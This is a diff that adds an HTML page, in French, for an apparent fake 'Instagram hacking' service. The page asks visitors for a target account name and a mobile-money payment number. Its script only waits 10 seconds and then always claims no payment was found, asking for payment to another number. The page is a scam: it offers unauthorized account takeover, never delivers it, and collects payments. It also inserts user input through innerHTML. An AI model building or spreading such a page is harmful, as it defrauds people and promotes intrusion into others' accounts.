@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="Insta.css">
+    <title>Document</title>
+</head>
+<body>
+    <nav class="nav">
+        <img src="Hlogo.png" class="logo">
+        <ul>
+            <li><a href="IndexHack.html">Acceuil</a></li>
+            <li><a href="#footer">Contact</a></li>
+            <li><a href="payment.html">Nos prix</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+        <img src="instagram.png" alt="" class="image">
+        <h3>Saisissez correctement le nom du compte Instagram que vous souhaitez pirater</h3>
+        <p>Inta Hack version: v.16.3.4 - 2024</p>
+        <div class="flex">
+            <input class="indicatif" id="indicatif" type="tel" placeholder="Saisir le nom compte à pirater">
+        </div>
+        <input type="tel" class="payment" placeholder="saisir le numéro qui à fait le transfert" id="ancre">
+        <div class="loader-container" id="loader-container">
+            <div class="loader"></div>
+            <p id="loading-text">Chargement en cours...</p>
+        </div>
+        <button id="load-button" class="btt"> Hack now</button>
+        <p>Waiting for verification to continue.</p>
+        <div class="astuce "><p>vous pouvez payez au <span>+221781711387</span> par Wave ou OM une fois le payement éffectuer vous mettez le numéro avec qui vous avez fait le transfert <a href="#ancre">ici</a> aprés l'application passera à la verification du payement afin de vous octroyer le compte <a href="payment.html">Nos tarifs</a></div>
+    </div>
+    <footer id="footer" class="experiance">
+        <div class="dash"></div>
+        <div class="contact">
+            <h2>Contact</h2>
+            <div class="dash4"></div>
+        </div>
+        <div class="contact1">
+            <h2 class="question1">Vous avez des questions ?</h2>
+            <h3 class="space">Je suis à votre service</h3>
+        </div>
+        <div class="contact2">
+            <div class="contact-item">
+                <i class="fa-solid fa-phone"></i>
+                <h3>Appeler sur</h3>
+                <p>+221781711387</p>
+            </div>
+            <div class="contact-item">
+                <i class="fa-solid fa-envelope"></i>
+                <h3>Email</h3>
+                <p>metzoapk@gmail.com</p>
+            </div>
+        </div>
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+              <span class="close">&times;</span>
+              <h2>Erreur</h2>
+              <p id="modal-message">Aucun paiement n'a été détecté pour le numéro de paiement saisi.</p>
+            </div>
+          </div>
+          
+    </footer>
+
+    <script>
+document.getElementById('load-button').addEventListener('click', function() {
+    // Afficher le conteneur de chargement
+    document.getElementById('loader-container').style.display = 'flex';
+    // Désactiver le bouton pendant le chargement
+    this.disabled = true;
+    // Récupérer le numéro saisi dans l'input "payment"
+    var numeroPaiement = document.getElementById('ancre').value;
+    // Attendre 10 secondes avant d'afficher la boîte modale
+    setTimeout(function() {
+        // Cacher le conteneur de chargement
+        document.getElementById('loader-container').style.display = 'none';
+        // Réactiver le bouton
+        document.getElementById('load-button').disabled = false;
+        // Construire le message d'erreur avec le numéro de paiement saisi
+        var errorMessage = "Aucun paiement n'a été détecté pour le numéro de paiement " + numeroPaiement + "Veuillez payer au 779732105 par Wave ou Om puis mettez le numéro avec qui vous avez payer";
+        // Afficher la boîte modale avec le message d'erreur
+        showModal(errorMessage);
+    }, 10000); // 10 secondes
+});
+
+// Fonction pour afficher la boîte modale avec un message personnalisé
+function showModal(message) {
+    var modal = document.getElementById("myModal");
+    var modalMessage = document.getElementById("modal-message");
+    modalMessage.innerHTML = message;
+    modal.style.display = "block";
+
+    var closeBtn = document.getElementsByClassName("close")[0];
+    closeBtn.onclick = function() {
+        modal.style.display = "none";
+    }
+
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+}
+
+
+    </script>
+</body>
+</html>
